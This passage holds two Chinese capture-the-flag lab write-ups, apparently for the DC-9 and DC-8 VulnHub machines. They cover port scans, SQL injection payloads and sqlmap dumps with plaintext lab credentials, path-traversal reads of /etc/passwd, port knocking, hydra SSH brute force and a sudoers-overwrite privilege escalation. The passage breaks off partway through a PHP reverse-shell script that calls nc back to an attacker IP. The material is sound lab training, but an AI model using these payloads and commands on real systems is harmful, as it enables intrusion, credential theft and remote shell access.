src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230732724.png" alt="image-20240623073206696"></p><blockquote><p>开放的tcp端口只有80，那么就意味着我们可能没有什么别的途径了，只能通过http去反弹shell了</p></blockquote><h2 id="1-3-目标开放UDP端口"><a href="#1-3-目标开放UDP端口" class="headerlink" title="1.3 目标开放UDP端口"></a>1.3 目标开放UDP端口</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sU --top-ports 20 192.168.48.129 -oA nmapscan/udpports<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230731866.png" alt="image-20240623073151838"></p><h2 id="1-4-开放TCP端口详细信息"><a href="#1-4-开放TCP端口详细信息" class="headerlink" title="1.4 开放TCP端口详细信息"></a>1.4 开放TCP端口详细信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sT -sV -sC -O -p80 192.168.48.129 -oA nmapscan/tcp-Details<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230734952.png" alt="image-20240623073402921"></p><blockquote><p>Apache 2.4.38</p><p>操作系统：Linux3.2-4.9</p></blockquote><h2 id="1-5-nmap漏洞扫描"><a href="#1-5-nmap漏洞扫描" class="headerlink" title="1.5 nmap漏洞扫描"></a>1.5 nmap漏洞扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -script=vuln -p80 192.168.48.129 -oA nmapscan/vuln<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230737742.png" alt="image-20240623073721710"></p><blockquote><p>可能存在CSRF，具体待定，还是到时候访问页面看看吧</p></blockquote><h1 id="2-信息检索"><a href="#2-信息检索" class="headerlink" title="2. 信息检索"></a>2. 信息检索</h1><h2 id="2-1-sql注入点"><a href="#2-1-sql注入点" class="headerlink" title="2.1 sql注入点"></a>2.1 sql注入点</h2><p>通过检索和测试最后找到了sql注入点，一般对于搜索框，存在sql注入的风险比较大，对于这个靶机的网址存在一个搜索，但是非常明显的是这个搜索不是通过get方式传输数据的，所以我们通过抓包可以知道是通过POST方式传输数据的；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230753952.png" alt="image-20240623075331916"></p><p>将其发送到重放器（Repeater）中进行测试，发现存在sql注入漏洞</p><blockquote><p>搜索内容为‘Mary’ or 1&#x3D;1#’仍可正常返回所有内容，可确定此处存在sql注入</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230754109.png" alt="image-20240623075453064"></p><p>后续使用sqlmap工具对其进行注入即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># sqlmap -u &lt;POST提交URL&gt; --data=&quot;&lt;存在sql注入的参数变量&gt;=&lt;啥都行&gt;&quot;</span><br>sqlmap -u http://192.168.48.129/results.php --data=<span class="hljs-string">&quot;search=Mary&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230810981.png" alt="image-20240623081058933"></p><p>确实成功被检测到存在sql注入漏洞，接下来就是跟get方式一样的查看数据库内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u http://192.168.48.129/results.php --data=<span class="hljs-string">&quot;search=1&quot;</span> --dbs<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230812591.png" alt="image-20240623081204544"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u http://192.168.48.129/results.php --data=<span class="hljs-string">&quot;search=1&quot;</span> -D <span class="hljs-built_in">users</span> --tables<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230812350.png" alt="image-20240623081244303"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u http://192.168.48.129/results.php --data=<span class="hljs-string">&quot;search=1&quot;</span> -D <span class="hljs-built_in">users</span> -T UserDetails --columns<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230813647.png" alt="image-20240623081320600"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u http://192.168.48.129/results.php --data=<span class="hljs-string">&quot;search=1&quot;</span> -D <span class="hljs-built_in">users</span> -T UserDetails -C username,password --dump<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230813403.png" alt="image-20240623081356342"></p><blockquote><p>| marym     | 3kfs86sfd     |<br>| julied    | 468sfdfsd2    |<br>| fredf     | 4sfd87sfd1    |<br>| barneyr   | RocksOff      |<br>| tomc      | TC&amp;TheBoyz    |<br>| jerrym    | B8m#48sd      |<br>| wilmaf    | Pebbles       |<br>| bettyr    | BamBam01      |<br>| chandlerb | UrAG0D!       |<br>| joeyt     | Passw0rd      |<br>| rachelg   | yN72#dsd      |<br>| rossg     | ILoveRachel   |<br>| monicag   | 3248dsds7s    |<br>| phoebeb   | smellycats    |<br>| scoots    | YR3BVxxxw87   |<br>| janitor   | Ilovepeepee   |<br>| janitor2  | Hawaii-Five-0 |<br>额。。。。。上面没一个账号是能录Manage的，我真是服了</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230831472.png" alt="image-20240623083130401"></p><p>顺便查查看刚才那个<code>Staff</code>数据库吧，也是职工数据库，不知道会有什么东西；与上述数据库查看的方式类似，最后在Staff数据库中的<code>Users</code>表中找到了admin用户的账户名和密码，但是密码经过加密</p><blockquote><p>| admin    | 856f5de590ef37314e7c3bdf6f8a66dc |</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230835523.png" alt="image-20240623083511468"></p><p>通过sqlmap使用普遍密码后缀爆破加密密码，从而爆破出来了admin用户的密码</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230836023.png" alt="image-20240623083629943"></p><blockquote><p>username:adminpassword:transorbital1</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230838666.png" alt="image-20240623083858612"></p><blockquote><p>成功登录后台管理系统；</p></blockquote><h2 id="2-2-目录爆破"><a href="#2-2-目录爆破" class="headerlink" title="2.2 目录爆破"></a>2.2 目录爆破</h2><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">dirsearch -u http:<span class="hljs-comment">//192.168.48.129/</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230851926.png" alt="image-20240623085129871"></p><blockquote><p>似乎并没有扫出什么有用的目录，另辟蹊径吧</p></blockquote><h2 id="2-3-端口敲门保护SSH"><a href="#2-3-端口敲门保护SSH" class="headerlink" title="2.3 端口敲门保护SSH"></a>2.3 端口敲门保护SSH</h2><p>参考链接：<a href="https://blog.csdn.net/weixin_48539059/article/details/130833674">https://blog.csdn.net/weixin_48539059/article/details/130833674</a></p><p>通过查资料发现，Linux有个端口敲门的保护机制，通过nmap扫描也能找到22端口是过滤状态</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sS -p- 192.168.48.129<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406281713044.png" alt="image-20240628171343999"></p><p>登录后台管理系统的时候可以发现，似乎存在文件包含漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406281731141.png" alt="image-20240628173146094"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">48.129</span><span class="hljs-regexp">/welcome.php?file=../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406281732607.png" alt="image-20240628173209548"></p><p>可以确认确实存在该漏洞，那么我们可以用来查看一下knockd的配置文件信息，以得到敲门端口的顺序</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">48.129</span><span class="hljs-regexp">/welcome.php?file=../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/etc/</span>knockd.conf<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406281733145.png" alt="image-20240628173315106"></p><blockquote><p>因此我们可以得到通过敲门打开ssh端口22的访问端口顺序为：7469、8475、9842</p></blockquote><p>因此我们通过以下指令打开端口22</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -z 192.168.48.129 7469 8475 9842<br></code></pre></td></tr></table></figure><p>现在可以看到22端口已经被打开了</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406281736747.png" alt="image-20240628173615703"></p><p>通过我们之前收集到的信息可以知道，我们在数据库中得到的一大串用户名和密码并未使用，可以尝试通过hydra工具来破解一下ssh试试</p><blockquote><p><code>username.txt</code>:</p><p>marym<br>julied<br>fredf<br>barneyr<br>tomc<br>jerrym<br>wilmaf<br>bettyr<br>chandlerb<br>joeyt<br>rachelg<br>rossg<br>monicag<br>phoebeb<br>scoots<br>janitor<br>janitor2</p><p><code>password.txt</code>:</p><p>3kfs86sfd<br>468sfdfsd2<br>4sfd87sfd1<br>RocksOff<br>TC&amp;TheBoyz<br>B8m#48sd<br>Pebbles<br>BamBam01<br>UrAG0D!<br>Passw0rd<br>yN72#dsd<br>ILoveRachel<br>3248dsds7s<br>smellycats<br>YR3BVxxxw87<br>Ilovepeepee<br>Hawaii-Five-0</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -L username.txt -P password.txt -e ns 192.168.48.129 ssh<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406281744949.png" alt="image-20240628174458899"></p><blockquote><p>成功爆破出三个账户：</p><p>username: chandlerbpassword: UrAG0D!</p><p>username: joeytpassword: Passw0rd</p><p>username: janitorpassword: Ilovepeepee</p></blockquote><p>通过ssh登录<code>janitor</code>账户查看内容时发现一个秘密文件夹<code>.secrets-for-putin</code></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406281810566.png" alt="image-20240628181038525"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406281811603.png" alt="image-20240628181131563"></p><blockquote><p>发现在其中发现了一个密码文件，我们将这些密码加入密码字典，在对靶机进行一次ssh密码爆破</p><p>BamBam01<br>Passw0rd<br>smellycats<br>P0Lic#10-4<br>B4-Tru3-001<br>4uGU5T-NiGHts</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -L username.txt -P password.txt -e ns 192.168.48.129 ssh<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406281815754.png" alt="image-20240628181520704">除了的三个用户以外，还找到了一个新的用户</p><blockquote><p>username: fredfpassword: B4-Tru3-001</p></blockquote><h1 id="3-提权"><a href="#3-提权" class="headerlink" title="3. 提权"></a>3. 提权</h1><p>登录用户<code>fredf</code>后，通过以下命令查看，找到了一个具有root权限的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo -l<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406282016614.png" alt="image-20240628183820326"></p><blockquote><p>找到了一个具有可执行权限的二进制文件，我们到相关目录进行执行</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /opt/devstuff/dist/test/<br><span class="hljs-built_in">ls</span><br>./test<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406281843368.png" alt="image-20240628184335101"></p><p>发现执行该二进制文件后，它跟我说了一个python文件的用法<code>test.py</code>，那么我们应该找到该文件，才能进行进一步的功能使用；那么其实也意味着该二进制文件应该是由该test.py文件编译出来的，我们先查看源码，了解该二进制文件的功能</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name test.py 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406281846891.png" alt="image-20240628184634851"></p><blockquote><p>根据输出结果我们比较容易能够确认该test.py文件应该是<code>/opt/devstuff/test.py</code>，因为跟二进制文件在同一目录下</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /opt/devstuff/test.py<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406281847738.png" alt="image-20240628184747690"></p><p>根据源码可知，该<code>test.py</code>文件的作用是读取第一个参数地址的文件内容，写入到第二个参数地址文件中</p><p><a href="https://blog.csdn.net/Field_Yang/article/details/51547804">sudo配置文件&#x2F;etc&#x2F;sudoers详解及实战用法</a></p><p>通过对<code>sudoers</code>文件的了解，我们可以修改某一个用户的<code>sudo</code>命令的执行权限进行获取root权限</p><p>首先，我们创建一个文件并写入内容，然后通过具有root权限的可执行的二进制文件写入到<code>/etc/sudoers</code>文件中，实现对用户权限的获取</p><p>创建一个临时文件写入内容<code>fredf   ALL=(ALL:ALL) ALL</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> /tmp/test<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;fredf   ALL=(ALL:ALL) ALL&quot;</span> &gt; /tmp/test<br>sudo ./test /tmp/test /etc/sudoers<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406282011166.png" alt="image-20240628201147118"></p><p>从而获得了执行sudo的权限</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406282013314.png" alt="image-20240628201323268"></p><p>因而拥有了root权限</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406282012959.png" alt="image-20240628201237917"></p><p>从而靶场也是成功通过啦！！！！</p><h1 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h1><ol><li>一些比较新颖的安全保护方案需要进一步的学习了解，比如今天学到的端口敲门保护方案</li><li>存在一些隐藏的文件夹不能够被直接看到可以通过ls命令的<code>-a</code>参数去查看</li><li>对于具有root权限的可执行文件需要格外注意，可能可以利用</li><li>对于一些linux系统的权限文件需要重点学习和关注，学会利用它们进行权限的获取</li></ol>]]></content>
    
    
    <categories>
      
      <category>渗透学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web攻防</tag>
      
      <tag>打靶日记</tag>
      
      <tag>渗透测试</tag>
      
      <tag>提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dc-8打靶日记</title>
    <link href="/2024/06/22/dc-8%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/"/>
    <url>/2024/06/22/dc-8%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="1-nmap扫描"><a href="#1-nmap扫描" class="headerlink" title="1. nmap扫描"></a>1. nmap扫描</h1><h2 id="1-1-确认目标ip地址"><a href="#1-1-确认目标ip地址" class="headerlink" title="1.1 确认目标ip地址"></a>1.1 确认目标ip地址</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sN 192.168.31.0/24<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406192120583.png" alt="image-20240619212047488"></p><blockquote><p>目标地址：192.168.31.182</p></blockquote><h2 id="1-2-目标开放TCP端口"><a href="#1-2-目标开放TCP端口" class="headerlink" title="1.2 目标开放TCP端口"></a>1.2 目标开放TCP端口</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sS --min-rate 10000 -p- 192.168.31.182 -oA nmapscan/tcpports<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406201850923.png" alt="image-20240620185020840"></p><blockquote><p>该目标开放的tcp端口有：22,80</p></blockquote><h2 id="1-3-目标开放UDP端口"><a href="#1-3-目标开放UDP端口" class="headerlink" title="1.3 目标开放UDP端口"></a>1.3 目标开放UDP端口</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sU --top-ports 20 192.168.31.182 -oA nmapscan/udpports<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406201850658.png" alt="image-20240620185040628"></p><blockquote><p>开放的udp端口其实没有太多的参考价值，没有思路的时候再考虑；</p></blockquote><h2 id="1-4-开放TCP端口详细信息"><a href="#1-4-开放TCP端口详细信息" class="headerlink" title="1.4 开放TCP端口详细信息"></a>1.4 开放TCP端口详细信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sT -sV -sC -O -p22,80 192.168.31.182 -oA nmapscan/tcpDetails<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406201854353.png" alt="image-20240620185427312"></p><blockquote><p>80端口：存在robots.txt文件，访问可以得到相关目录</p><p>操作系统：Linux3.2-4.9</p><p>网页框架信息：Drupal 7</p></blockquote><h2 id="1-5-nmap漏洞扫描"><a href="#1-5-nmap漏洞扫描" class="headerlink" title="1.5 nmap漏洞扫描"></a>1.5 nmap漏洞扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -script=vuln -p22,80 192.168.31.182 -oA nmapscan/vuln<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406201854771.png" alt="image-20240620185445735"></p><blockquote><p>没有什么有用的信息；</p></blockquote><h1 id="2-信息检索"><a href="#2-信息检索" class="headerlink" title="2. 信息检索"></a>2. 信息检索</h1><h2 id="2-1-目录检索"><a href="#2-1-目录检索" class="headerlink" title="2.1 目录检索"></a>2.1 目录检索</h2><p>首先根据一开始端口扫面得到的robots.txt文件去查看一下网站的目录结构；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406201905145.png" alt="image-20240620190533094"></p><blockquote><p>可以观察到可能能够获得资料信息的目录就是：(其他的也可以访问看看，说不定有意料之外的)</p><p>&#x2F;admin&#x2F;</p><p>&#x2F;user&#x2F;login</p><p>&#x2F;?q&#x3D;search&#x2F;</p><p>&#x2F;install.php</p><p>&#x2F;update.php</p></blockquote><p>在<code>/user/login</code>来到了用户登录界面，但是根据前面的靶场这个9成也是后台登录界面</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406201909578.png" alt="image-20240620190949536"></p><p>随后其他页面大部分也拒绝访问，应该是因为没有账号登录；</p><p>来到网页首页，随便点点后发现点击右侧的Details的控件后，出现了疑似sql注入点</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406201926518.png" alt="image-20240620192649477"></p><p>通过手动注入验证，发现在数字后加入单引号引起报错，可以基本确定是sql注入点</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">192.168.31.182</span>/?nid=<span class="hljs-number">1</span>&#x27;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406201929429.png" alt="image-20240620192905392"></p><p>通过order by确定其查询数据库的字段数，依次增加知道网站报错前即可，最后发现其仅查询了一个字段</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">192.168.31.182</span>/?nid=-<span class="hljs-number">1</span> order by <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>通过该字段查询一下数据库信息</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">http://<span class="hljs-number">192.168</span><span class="hljs-number">.31</span><span class="hljs-number">.182</span>/?nid=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">schema_name</span>) <span class="hljs-keyword">from</span> information_schema.schemata<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406201934461.png" alt="image-20240620193433420"></p><p>真的拿到了数据库的信息，那么我们上sqlmap</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://192.168.31.182/?nid=1&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406201942617.png" alt="image-20240620194242568"></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">sqlmap -u <span class="hljs-string">&quot;http://192.168.31.182/?nid=1&quot;</span> <span class="hljs-comment">--dbs</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406201943980.png" alt="image-20240620194327932"></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">sqlmap -u <span class="hljs-string">&quot;http://192.168.31.182/?nid=1&quot;</span> -D d7db <span class="hljs-comment">--tables</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406201953739.png" alt="image-20240620195302681"></p><blockquote><p>可以看到有个users表，一般是记录用户相关信息的；查看一下其列表名</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://192.168.31.182/?nid=1&quot;</span> -D d7db -T <span class="hljs-built_in">users</span> --columns<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406201957738.png" alt="image-20240620195747699"></p><blockquote><p>可以看到有name和pass字段，这两个字段没有不看的理由的</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://192.168.31.182/?nid=1&quot;</span> -D d7db -T <span class="hljs-built_in">users</span> -C name,pass --dump<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406201959049.png" alt="image-20240620195927014"></p><blockquote><p>admin  | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z<br>john   | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku&#x2F;3if&#x2F;oRVZJaz5mKC2vF </p></blockquote><p>可以看到相应的用户名和通过加密的密码。有了密码，想办法尝试破解一下，使用john和hydra等工具进行尝试；</p><h2 id="2-2-hydra密码爆破"><a href="#2-2-hydra密码爆破" class="headerlink" title="2.2 hydra密码爆破"></a>2.2 hydra密码爆破</h2><p>首先创建一个用户名字典</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> usernameDict.txt<br>vim usernameDict.txt<br></code></pre></td></tr></table></figure><p>向字典中写入用户名<code>admin</code>和<code>john</code>，然后使用hydra攻击对目标机器的ssh进行爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -L usernameDict.txt -P /usr/share/wordlists/rockyou.txt -e ns 192.168.31.182 ssh<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406202052986.png" alt="image-20240620205239935"></p><p>hydra爆破了大概半个钟也没出什么结果，也没什么必要进行下去了，时间太长了，真实环境早该被发现了；</p><h2 id="2-3-john密码爆破"><a href="#2-3-john密码爆破" class="headerlink" title="2.3 john密码爆破"></a>2.3 john密码爆破</h2><p>相同的方式将加密后的密码放置到一个文档<code>hash-passwd.txt</code>中，然后使用john工具对密码进行破解</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">john hash-passwd.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406202054390.png" alt="image-20240620205446347"></p><blockquote><p>可以看到已经出现了一个密码，但是不确定是admin还是john的密码，使用这个密码登录一下后台试试（通过尝试后知道，这个密码是john用户的密码）</p><p>后面一个密码爆破了半个多小时也没爆破出来</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406212358968.png" alt="image-20240621235811855"></p><h2 id="2-4-webShell"><a href="#2-4-webShell" class="headerlink" title="2.4 webShell"></a>2.4 webShell</h2><p>通过对网页的不断翻找和信息查询，最后在<code>Contact Us</code>中的<code>Webform</code>中找到了可以执行php命令的地方</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406220000143.png" alt="image-20240622000003091"></p><p>其中存在一个设置的选项，能够选择文本的编码，其中存在<code>php code</code>文本格式，可以执行php指令</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406220003522.png" alt="image-20240622000317412"></p><p>简单进行一下测试看看怎么能够触发，先写入phpinfo()试试</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406220009470.png" alt="image-20240622000932407"></p><p>经过测试，当我们成功提交了联系邮件后则会触发我们写入的php语句，那么我们只需要写入相应的shell反弹语句，将shell反弹到我们的攻击机即可。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406220009335.png" alt="image-20240622000911256"></p><p>写入一下反弹shell脚本，攻击机监听5555端口；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 攻击机器IP和监听端口</span><br><span class="hljs-variable">$target_ip</span> = <span class="hljs-string">&#x27;192.168.111.129&#x27;</span>;<br><span class="hljs-variable">$target_port</span> = <span class="hljs-string">&#x27;5555&#x27;</span>;<br><br><span class="hljs-comment">// 构建反弹Shell命令</span><br><span class="hljs-variable">$command</span> = <span class="hljs-string">&quot;nc <span class="hljs-subst">$target_ip</span> <span 